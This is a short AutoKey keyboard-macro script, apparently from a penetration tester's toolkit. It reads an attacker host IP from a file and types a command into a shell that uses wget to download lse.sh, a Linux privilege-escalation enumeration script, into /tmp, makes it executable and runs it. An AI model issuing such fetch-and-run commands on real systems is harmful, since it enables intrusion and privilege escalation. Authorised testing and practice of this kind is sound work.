import os
with open('/home/bob/git/autokey/host.txt') as file: 
    ip = file.read().replace('\n', '')

keyboard.send_keys('wget -O /tmp/lse.sh http://%s:8000/lse.sh && chmod 755 /tmp/lse.sh && /tmp/lse.sh' % ip)
keyboard.send_keys("<enter>")
